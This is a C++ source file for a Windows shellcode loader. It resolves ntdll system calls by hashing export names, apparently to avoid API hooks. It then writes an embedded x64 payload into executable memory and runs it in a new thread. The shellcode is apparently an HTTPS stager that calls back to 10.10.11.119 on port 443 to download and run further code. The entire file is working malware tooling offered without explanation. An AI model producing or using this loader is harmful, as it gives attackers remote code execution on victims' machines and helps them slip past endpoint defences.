#include <iostream>
#include <Windows.h>

typedef NTSTATUS(WINAPI* NtCreateThreadEx)
(
    OUT PHANDLE                 hThread,
    IN ACCESS_MASK              DesiredAccess,
    IN LPVOID                   ObjectAttributes,
    IN HANDLE                   ProcessHandle,
    IN LPTHREAD_START_ROUTINE   lpStartAddress,
    IN LPVOID                   lpParameter,
    IN BOOL                     CreateSuspended,
    IN ULONG                    StackZeroBits,
    IN ULONG                    SizeOfStackCommit,
    IN ULONG                    SizeOfStackReserve,
    OUT LPVOID                  lpBytesBuffer
);

typedef NTSTATUS (WINAPI* NtAllocateVirtualMemory)
(   HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(WINAPI* NtWriteVirtualMemory)
(
    IN HANDLE               ProcessHandle,
    IN PVOID                BaseAddress,
    IN PVOID                Buffer,
    IN ULONG                NumberOfBytesToWrite,
    OUT PULONG              NumberOfBytesWritten OPTIONAL
);

using namespace std;

size_t FNV(char* s)
{
    if ((s != NULL) && (s[0] == '\0')) {
        return 0;
    }
    size_t hash = 2166136261U;
    for (size_t i = 0; i < strlen(s); i++)
    {
        hash = hash ^ (s[i]);
        hash = hash * 16777619;
    }
    return hash;
}

PVOID WINAPI GetFunctionFromExportTable(size_t functionHash)
{
    printf("[*] Looking for hash...\n");
    HMODULE hModule = GetModuleHandle(L"ntdll.dll");

    if (!hModule)
    {
        return NULL;
    }

    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)hModule;
    if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return NULL;
    }

    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + dosHeaders->e_lfanew);

    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        return NULL;
    }

    if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
    {
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD Address = (PDWORD)((LPBYTE)hModule + exportDirectory->AddressOfFunctions);
    PDWORD Name = (PDWORD)((LPBYTE)hModule + exportDirectory->AddressOfNames);
    PWORD Ordinal = (PWORD)((LPBYTE)hModule + exportDirectory->AddressOfNameOrdinals);

    for (int i = 0; i < exportDirectory->AddressOfFunctions; i++)
    {
        size_t hash = FNV((char*)hModule + Name[i]);
        if ((int)functionHash == (int)hash)
        {
            printf("   |-> Hash: %d\n\n", (int)hash);
            return (PVOID)((LPBYTE)hModule + Address[Ordinal[i]]);
        }
    }
    return NULL;
}

int main()
{
    // Shellcode
    unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\xbb\x01\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x31\x68\x72\x52\x00\x5e\xf5\x52\x6e\xa4\xfb\xb9\xeb\x0e\x6b\x33\x8c\x8b\x0d\x74\xaf\x70\x64\x18\x13\xb6\x35\xa6\xea\xe5\x0e\x6d\x7c\x73\x1d\x79\x4d\xb1\x8e\x60\xd3\x94\x5c\xa4\xf8\xb8\x8f\xdf\x96\x87\x47\x47\x19\x3b\x26\x25\x03\xe3\x84\x75\xa8\x84\x3e\x69\x64\xa0\x35\xb0\x56\x89\x34\x8b\x62\x30\x18\xfd\x83\x30\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x79\x69\x65\x31\x31\x3b\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x0d\x0a\x00\xa3\x80\xc6\x07\xb7\xeb\xb3\xf0\x9e\x55\x86\xeb\xeb\x9c\x9e\xad\x94\x19\xcc\x78\x47\x8f\x4a\x65\x8f\x22\xd9\xbc\x6b\xa1\x9d\x84\xe9\x6f\x1b\x21\x63\xc9\xae\xb5\xca\x84\x39\xb2\xc4\x09\xbb\x01\x1e\xb4\x58\xfe\x2e\xf8\xd0\xb8\x2a\x07\x84\x87\xfb\x28\x83\x20\x9d\x62\xee\x54\x7b\x41\x7e\x5a\x9f\xef\xa8\xd7\x5e\xb3\xc3\xc9\xa9\x5f\xe5\xf7\x4b\x1f\x0a\x19\x98\x5b\x2c\x4d\xee\x0f\x13\x71\xa7\x54\x86\x25\xe7\xf4\xb9\xd4\xe1\x1b\x54\x8b\x25\xee\x87\x20\x27\x15\x6e\xc7\xb8\x64\x70\x2b\x6a\x2a\x0b\xc5\x6b\xdc\x2d\x8c\x58\x1f\xbe\xf1\xc5\xd9\x19\xa1\xa8\x65\x63\xf0\x9f\x6c\x54\x40\x03\xd9\xf2\xcd\x3a\xd5\xfc\x21\xc5\xa7\xac\xa9\xc8\x71\x6b\x24\x68\x67\x3a\x6f\xb5\xb2\x60\xc6\x7f\x3b\x32\x94\xfe\xbb\xcd\xd1\x62\xd3\x9b\x13\xdd\xa0\xc1\xd0\xbd\xf8\xc6\x03\xf8\xf6\x7a\x1d\xf4\x46\x90\xeb\x5b\xd7\xcd\xe0\x7a\x49\x09\xe4\xf7\xeb\xd5\x96\xe0\xc1\x83\x5d\x68\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x2e\x31\x30\x2e\x31\x31\x2e\x31\x31\x39\x00\x6a\x4e\x4a\xd6";

    //Shellcode size
    SIZE_T shellcodeSize = 891;

    HANDLE hProcess = GetCurrentProcess();
    NTSTATUS status;

    LPVOID PNtAllocateVirtualMemory = GetFunctionFromExportTable(-899171976);
    NtAllocateVirtualMemory _NtAllocateVirtualMemory = (NtAllocateVirtualMemory)PNtAllocateVirtualMemory;

    LPVOID PNtWriteVirtualMemory = GetFunctionFromExportTable(1138962226);
    NtWriteVirtualMemory _NtWriteVirtualMemory = (NtWriteVirtualMemory)PNtWriteVirtualMemory;

    LPVOID pNtCreateThreadEx = GetFunctionFromExportTable(-318401318);
    NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)pNtCreateThreadEx;

    printf("[*] Casting...\n");

    if (PNtAllocateVirtualMemory == NULL) {
        printf("[!] Failed to get address of NtAllocateVirtualMemory\n");
        return 2;
    }
    else {
        printf("   |-> NtAllocateVirtualMemory Address: %p\n", PNtAllocateVirtualMemory);
    }

    if (PNtWriteVirtualMemory == NULL) {
        printf("[!] Failed to get address of NtWriteVirtualMemory\n");
        return 2;
    }
    else {
        printf("   |-> NtWriteVirtualMemory Address: %p\n", PNtWriteVirtualMemory);
    }

    if (pNtCreateThreadEx == NULL) {
        printf("[!] Failed to get address of NtCreateThreadEx\n");
        return 2;
    }
    else {
        printf("   |-> NtCreateThreadEx Address: %p\n", pNtCreateThreadEx);
    }

    printf("\n");

    printf("[*] Executing...\n");

    PVOID pAddress = NULL;
     status = _NtAllocateVirtualMemory(hProcess, &pAddress, 0x0, &shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (pAddress == NULL) {
        printf("[!] Failed to allocate memory!\n");
        return 2;
    }
    else{
        printf("   |-> Base Address: %p\n", pAddress);
    }

    // Copy to Base Address
    int bytesWritten;
    status = _NtWriteVirtualMemory(hProcess, pAddress, shellcode, sizeof(shellcode), (PULONG)&bytesWritten);
    if (status != 0) {
        printf("[!] Failed to write shellcode: %X\n", status);
        CloseHandle(hProcess);
    }
    else {
        printf("   |-> Bytes written: %d\n", bytesWritten);
    }

    HANDLE hThread = NULL;
    status = _NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)pAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (hThread == NULL) {
        printf("[!] Failed to create thread, error: %d\n", 0);
        return 2;
    }
    else {
        printf("   |-> Thread Handle: %p\n", hThread);
    }
    
    if (hThread != NULL) {
        CloseHandle(hProcess);
        WaitForSingleObject(hThread, INFINITE);
    }
    else {
        CloseHandle(hProcess);
        return 2;
    }
    return 0;
}